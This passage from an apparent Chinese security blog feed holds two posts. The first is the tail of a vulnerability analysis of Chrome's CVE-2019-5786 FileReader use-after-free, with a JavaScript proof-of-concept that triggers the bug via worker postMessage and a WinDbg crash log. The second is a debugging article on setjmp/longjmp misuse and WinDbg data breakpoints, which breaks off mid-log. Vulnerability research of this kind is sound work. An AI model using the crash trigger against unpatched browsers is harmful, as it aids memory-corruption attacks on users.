&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> errmsg = <span class="string">'ArrayBuffer at index 1 could not be transferred'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (e.message.indexOf(errmsg) != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab2);</span></span><br><span class="line"><span class="javascript">            dv.setUint32(<span class="number">4</span>, <span class="number">0x42424242</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.setTimeout(init, <span class="number">1000</span>);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">init();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// worker.js</span></span><br><span class="line">onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里向工作者线程 <code>postMessage</code> 的小技巧参考了 Exodus Intelligence 的代码。注意 <code>postMessage</code> 本身也是异步执行的，也就是调用之后会立刻返回，如果是下面这样的写法，可能无法触发 Crash ，因为主线程中 ArrayBuffer 的 <strong>backing store</strong> 可能还没有被释放。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">worker.postMessage(ab1, [ab1]);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab2);</span><br><span class="line">dv.setUint32(<span class="number">4</span>, <span class="number">0x42424242</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>而如果采用 <code>worker.postMessage(ab1, [ab1, ab2])</code> 这样的写法，当 <code>ab1</code> 传送完毕之后传送 <code>ab2</code> 时会抛出一个异常，此时主线程中 ArrayBuffer 的 <strong>backing store</strong> 已经被释放，可以非常稳定的触发 UAF 操作。</p><blockquote><p>Uncaught DOMException: Failed to execute ‘postMessage’ on ‘Worker’: ArrayBuffer at index 1 could not be transferred.</p></blockquote><p>查看 Chrome Stable 版本的发布历史，可以知道 <code>72.0.3626.121</code> 的上一个版本号为 <code>72.0.3626.119</code> ，因此可以下载该版本的 <a href="https://programlife.net/tags/Chrome/">Chrome</a> 进行测试。测试时注意屏蔽 Internet 访问，否则可能会自动升级。测试上面的 POC 代码可以发现，漏洞的触发非常稳定。</p><p><img src="/uploads/201903/cve-2019-5786-chrome-filereader-uaf-vulnerability.png" alt="CVE-2019-5786 Chrome FileReader ArrayBuffer UAF"></p><p>如果将 <a href="https://programlife.net/tags/WinDbg/">WinDbg</a> 附加到 Chrome 的网页渲染进程（可以打开 Chrome 的任务管理器来查看进程 PID ），可以捕获到相关的异常信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(74c.2a4): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00000004 ebx=02b30ec8 ecx=00000042 edx=00000042 esi=00000042 edi=2b404000</span><br><span class="line">eip=5f625606 esp=0021ecc0 ebp=0021ece8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202</span><br><span class="line">chrome_child!ovly_debug_event+0x10c1fa6:</span><br><span class="line">5f625606 881407          mov     byte ptr [edi+eax],dl      ds:0023:2b404004=??</span><br><span class="line"></span><br><span class="line">0:000&gt; r edi</span><br><span class="line">edi=2b404000</span><br><span class="line"></span><br><span class="line">0:000&gt; r eax</span><br><span class="line">eax=00000004</span><br><span class="line"></span><br><span class="line">0:000&gt; r dl</span><br><span class="line">dl=42</span><br></pre></td></tr></table></figure><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03. 小结"></a>0x03. 小结</h2><p>这次 <a href="https://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a> 尽管花费了一定的休息时间，但是作为第一个浏览器漏洞，在分析的过程中还是学到了不少东西，希望下次有时间可以学习一下这个漏洞的 Exploit 的编写。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-漏洞简介&quot;&gt;&lt;a href=&quot;#0x01-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01. 漏洞简介&quot;&gt;&lt;/a&gt;0x01. 漏洞简介&lt;/h2&gt;&lt;p&gt;准备用业余时间学习一点浏览器漏洞利用相关的知识，刚好最近 Chrome 爆出来一个野外利用漏洞 CVE-2019-5786 ，而且网上也有两篇比较详细的分析报告（来自 &lt;a href=&quot;https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Exodus Intelligence&lt;/a&gt; 和 &lt;a href=&quot;https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/analysis-of-a-chrome-zero-day-cve-2019-5786/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;McAfee Labs&lt;/a&gt;），刚好可以借鉴学习一下漏洞的原理以及利用技巧。&lt;/p&gt;
&lt;p&gt;Chrome 72.0.3626.121 的 &lt;a href=&quot;https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;安全公告&lt;/a&gt; 显示，漏洞 CVE-2019-5786 由 Google Threat Analysis Group 的 Clement Lecigne 发现其被利用于野外攻击（配合 Windows 内核空指针漏洞 CVE-2019-0808 可实现 Windows 7 下的提权操作）。&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Chrome" scheme="http://programlife.net/categories/Vulnerability/Chrome/"/>
    
    
      <category term="Use-After-Free" scheme="http://programlife.net/tags/Use-After-Free/"/>
    
      <category term="CVE-2019-5786" scheme="http://programlife.net/tags/CVE-2019-5786/"/>
    
      <category term="Chrome" scheme="http://programlife.net/tags/Chrome/"/>
    
      <category term="FileReader" scheme="http://programlife.net/tags/FileReader/"/>
    
      <category term="漏洞分析" scheme="http://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Neuter" scheme="http://programlife.net/tags/Neuter/"/>
    
  </entry>
  
  <entry>
    <title>为什么我的 WinDbg 内存断点失效了？</title>
    <link href="http://programlife.net/2019/03/11/why-my-windbg-data-breakpoint-did-not-work-as-expected/"/>
    <id>http://programlife.net/2019/03/11/why-my-windbg-data-breakpoint-did-not-work-as-expected/</id>
    <published>2019-03-11T21:31:00.000Z</published>
    <updated>2019-03-11T17:14:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-问题描述"><a href="#0x01-问题描述" class="headerlink" title="0x01. 问题描述"></a>0x01. 问题描述</h2><p>周末在测试一个程序时，发现其莫名其妙的 Crash 在了一个系统自带 DLL 的某个函数里面，而且很难直观地看出来 Crash 的原因，分析之后发现是不当使用 C 语言 <code>setjmp</code> 和 <code>longjmp</code> 两个函数导致的。那么这和文章标题有什么联系呢？笔者在分析的过程中使用了 WinDbg 的内存断点（ Processor Breakpoint / Data Breakpoint ）来跟踪一个栈变量的读写操作，理论上这个断点会多次命中，但实际上只命中了一次，而这个现象正是由于不当使用 <code>setjmp</code> 和 <code>longjmp</code> 导致 <code>esp</code> 和 <code>ebp</code> 寄存器的值的非预期改变所导致的。</p><a id="more"></a><h2 id="0x02-setjmp-longjmp"><a href="#0x02-setjmp-longjmp" class="headerlink" title="0x02. setjmp / longjmp"></a>0x02. setjmp / longjmp</h2><p>在分析具体的问题之前，先简单了解一下 C 语言中这两个不太常见的函数 <code>setjmp</code> 和 <code>longjmp</code> 。</p><p>在 C 语言中，可以使用 <code>goto</code> 语句来实现函数内部的任意跳转，而 <code>setjmp</code> 和 <code>longjmp</code> 则可以实现函数间的任意跳转，和 <code>goto</code> 语句一样，配合使用 <code>setjmp</code> 和 <code>longjmp</code> 可以实现简单的异常处理。这两个函数的声明位于头文件 <code>setjmp.h</code> 中，声明如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">setjmp</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    _Out_ jmp_buf _Buf</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line">__declspec(noreturn) <span class="keyword">void</span> __<span class="function">cdecl <span class="title">longjmp</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ jmp_buf _Buf,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ <span class="keyword">int</span>     _Value</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>函数 <code>setjmp</code> 接收类型为 <code>jmp_buf</code> 的参数 <code>_Buf</code> （通常命名为 <code>env</code> ），这里 <code>jmp_buf</code> 是通过 <code>typedef</code> 定义的一个别名，表示元素个数为 <code>16</code> 的 <code>int</code> 数组（和定义函数指针时一样，这里 <code>typedef</code> 的写法很不直观）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _JBLEN  16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _JBTYPE int</span></span><br><span class="line"><span class="keyword">typedef</span> _JBTYPE jmp_buf[_JBLEN];</span><br></pre></td></tr></table></figure><p>调用 <code>setjmp</code> 函数可以保存 <code>setjmp</code> 返回时的一些上下文信息（前面提到参数通常命名为 <code>env</code> 会显得更加直观），类似 <code>GetThreadContext</code> 保存线程的上下文信息一样，只不过 <code>setjmp</code> 保存的信息更少。直接调用 <code>setjmp</code> 时其返回值总是为 <code>0</code> 。</p><p>函数 <code>longjmp</code> 则跳转回调用 <code>setjmp</code> 的地方，并将 <code>setjmp</code> 的返回值设置为 <code>longjmp</code> 第二个参数所指定的值，这样调用完 <code>setjmp</code> 之后可以通过返回值判断跳转来自哪里。</p><p>下面通过一个简单的例子来说明 <code>setjmp</code> 和 <code>longjmp</code> 的用法：编译以下代码，不难理解程序的输出为 <code>1337</code> 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOINLINE __declspec(noinline)</span></span><br><span class="line"></span><br><span class="line"><span class="function">NOINLINE <span class="keyword">void</span> <span class="title">bar</span><span class="params">(jmp_buf* env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    longjmp(*env, <span class="number">1337</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this line will never be printed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NOINLINE <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    jmp_buf env;</span><br><span class="line">    <span class="keyword">int</span> result = setjmp(env);</span><br><span class="line">    <span class="comment">// __asm int 3;</span></span><br><span class="line">    <span class="keyword">if</span> (result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"result = %d\n"</span>, result);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bar(&amp;env);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    foo();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里暂时不深究 <code>setjmp</code> 的底层实现细节，只需要知道 <code>jmp_buf</code> 中有一个元素保存了 <code>setjmp</code> 返回之后的 <code>eip</code> 即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(2a54.3334): Break instruction exception - code 80000003 (!!! second chance !!!)</span><br><span class="line">eax=00000000 ebx=00fb8000 ecx=00000000 edx=010ffb6c esi=002a9df0 edi=0131d650</span><br><span class="line">eip=0029106e esp=010ffb6c ebp=010ffbb0 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206</span><br><span class="line">Test!foo+0x1e:</span><br><span class="line">0029106e cc              int     3</span><br><span class="line"></span><br><span class="line">0:000&gt; ub eip</span><br><span class="line">Test!foo+0x6 [c:\users\test\source\repos\test\test\test.cpp @ 13]:</span><br><span class="line">00291056 a104902a00      mov     eax,dword ptr [Test!__security_cookie (002a9004)]</span><br><span class="line">0029105b 33c5            xor     eax,ebp</span><br><span class="line">0029105d 8945fc          mov     dword ptr [ebp-4],eax</span><br><span class="line">00291060 8d45bc          lea     eax,[ebp-44h]</span><br><span class="line">00291063 6a00            push    0</span><br><span class="line">00291065 50              push    eax</span><br><span class="line">00291066 e875090100      call    Test!__setjmp3 (002a19e0)</span><br><span class="line">0029106b 83c408          add     esp,8          ; eip after setjmp&apos;s return</span><br><span class="line"></span><br><span class="line">0:000&gt; dd ebp-44 L10</span><br><span class="line">010ffb6c  010ffbb0 00fb8000 0131d650 002a9df0</span><br><span class="line">010ffb7c  010ffb60 0029106b 010ffbec 00000000   ; env[5] = eip</span><br><span class="line">010ffb8c  56433230 00000000 010ffbb8 010ffbb8</span><br><span class="line">010ffb9c  0029117c 00000000 00294fc0 00291300</span><br></pre></td></tr></table></figure><h2 id="0x03-Crash-分析"><a href="#0x03-Crash-分析" class="headerlink" title="0x03. Crash 分析"></a>0x03. Crash 分析</h2><p>介绍完 <code>setjmp</code> 和 <code>longjmp</code> 之后，让我们回到正题。问题模型简化后的代码如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOINLINE __declspec(noinline)</span></span><br><span class="line"></span><br><span class="line"><span class="function">NOINLINE <span class="keyword">void</span> <span class="title">bar</span><span class="params">(jmp_buf* env, <span class="keyword">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!value)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> env_eip = ((<span class="keyword">int</span> *)env)[<span class="number">5</span>];</span><br><span class="line">        __asm</span><br><span class="line">        &#123;</span><br><span class="line">            xor eax, eax</span><br><span class="line">            mov ebx, env_eip</span><br><span class="line">            jmp ebx</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    longjmp(*env, <span class="number">1337</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this line will never be printed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NOINLINE <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">0</span>;</span><br><span class="line">    jmp_buf env;</span><br><span class="line">    <span class="keyword">int</span> result = setjmp(env);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"result = %d\n"</span>, result);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bar(&amp;env, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    foo();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行这段代码会造成 Crash ，具体的位置为 <code>ntdll!RtlUnwind+0x3c52f</code> ，此时如果尝试继续运行程序，则会相继 Crash 在多个不同的位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">(12dc.3570): Unknown exception - code c0000029 (!!! second chance !!!)</span><br><span class="line">eax=00c1f9c0 ebx=00c1fe70 ecx=00c20000 edx=00c1d000 esi=00b0107d edi=00c1fd5c</span><br><span class="line">eip=774d341f esp=00c1f9a0 ebp=00c1fd3c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">ntdll!RtlUnwind+0x3c52f:</span><br><span class="line">774d341f 8b4c240c        mov     ecx,dword ptr [esp+0Ch] ss:002b:00c1f9ac=00c20000</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">WARNING: Continuing a non-continuable exception</span><br><span class="line">(12dc.3570): Unknown exception - code c0000029 (first chance)</span><br><span class="line">(12dc.3570): Unknown exception - code c0000029 (!!! second chance !!!)</span><br><span class="line">eax=00c1f9c0 ebx=00c1fedc ecx=00c20000 edx=00c1d000 esi=00b0107d edi=00c1fd5c</span><br><span class="line">eip=774d341f esp=00c1f9a0 ebp=00c1fd3c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">ntdll!RtlUnwind+0x3c52f:</span><br><span class="line">774d341f 8b4c240c        mov     ecx,dword ptr [esp+0Ch] ss:002b:00c1f9ac=00c20000</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">WARNING: Continuing a non-continuable exception</span><br><span class="line">(12dc.3570): Unknown exception - code c0000029 (first chance)</span><br><span class="line">(12dc.3570): Unknown exception - code c0000029 (!!! second chance !!!)</span><br><span class="line">eax=00c1f9c0 ebx=00c1fef4 ecx=00c20000 edx=00c1d000 esi=00b0107d edi=00c1fd5c</span><br><span class="line">eip=774d341f esp=00c1f9a0 ebp=00c1fd3c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">ntdll!RtlUnwind+0x3c52f:</span><br><span class="line">774d341f 8b4c240c        mov     ecx,dword ptr [esp+0Ch] ss:002b:00c1f9ac=00c20000</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">WARNING: Continuing a non-continuable exception</span><br><span class="line">(12dc.3570): Unknown exception - code 80000026 (!!! second chance !!!)</span><br><span class="line">eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=00000000 edi=00000000</span><br><span class="line">eip=00b01ffe esp=00c1fd54 ebp=00c1fdec iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206</span><br><span class="line">Test!___longjmp_internal+0x4e:</span><br><span class="line">00b01ffe 5e              pop     esi</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">(12dc.3570): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00b0107d ebx=c483ffff ecx=1b2b3725 edx=00000000 esi=e8a2110c edi=00000000</span><br><span class="line">eip=00b0263e esp=00c1fd2c ebp=00c1fdec iopl=0         nv up ei pl nz ac pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216</span><br><span class="line">Test!__local_unwind2+0x48:</span><br><span class="line">00b0263e 8b0cb3          mov     ecx,dword ptr [ebx+esi*4] ds:002b:670c442f=????????</span><br></pre></td></tr></table></figure><p>如果给 <code>foo</code> 函数下断点，只会命中一次，而如果给 <code>bar</code> 函数下断点，则会命中多次，这很好理解。如果在 <code>foo</code> 函数中给局部变量 <code>value</code> 下内存读写断点，该断点只会命中一次（在变量被初始化为 <code>0</code> 的时候）。理论上来说，进入函数 <code>bar</code> 时，传入的参数 <code>value</code> 的值应该总是 <code>0</code> ，但是实际上并非如此，而且我们在 <code>foo</code> 函数中下的内存断点也无法监控到 <code>value</code> 的值的<strong><em>改变</em></strong>，在 WinDbg 中可以进行验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">$$ 分别给两个函数下断点</span><br><span class="line">0:000&gt; bu Test!foo</span><br><span class="line">0:000&gt; bu Test!bar</span><br><span class="line"></span><br><span class="line">$$ 继续运行被调试程序，等待第一个断点命中，进入 foo 函数</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=012062d0 ebx=00c6c000 ecx=00000000 edx=c7664979 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b010a0 esp=00eff838 ebp=00eff880 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class="line">Test!foo:</span><br><span class="line">00b010a0 55              push    ebp</span><br><span class="line"></span><br><span class="line">$$ 等待栈帧建立完毕</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=012062d0 ebx=00c6c000 ecx=00000000 edx=c7664979 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b010a1 esp=00eff834 ebp=00eff880 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class="line">Test!foo+0x1:</span><br><span class="line">00b010a1 8bec            mov     ebp,esp</span><br><span class="line"></span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=012062d0 ebx=00c6c000 ecx=00000000 edx=c7664979 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b010a3 esp=00eff834 ebp=00eff834 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class="line">Test!foo+0x3:</span><br><span class="line">00b010a3 83ec48          sub     esp,48h</span><br><span class="line"></span><br><span class="line">$$ 局部变量 value 存放于 ebp-48 处，下内存读写断点监控</span><br><span class="line">0:000&gt; ba w4 ebp-48</span><br><span class="line"></span><br><span class="line">0:000&gt; bl</span><br><span class="line">     0 e Disable Clear  00b010a0     0001 (0001)  0:**** Test!foo</span><br><span class="line">     1 e Disable Clear  00b01040     0001 (0001)  0:**** Test!bar</span><br><span class="line">     2 e Disable Clear  00eff7ec w 4 0001 (0001)  0:**** </span><br><span class="line"></span><br><span class="line">$$ 继续执行，value 初始化时第一次命中内存断点</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 2 hit</span><br><span class="line">eax=00eff7f0 ebx=00c6c000 ecx=00000000 edx=c7664979 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b010ba esp=00eff7ec ebp=00eff834 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206</span><br><span 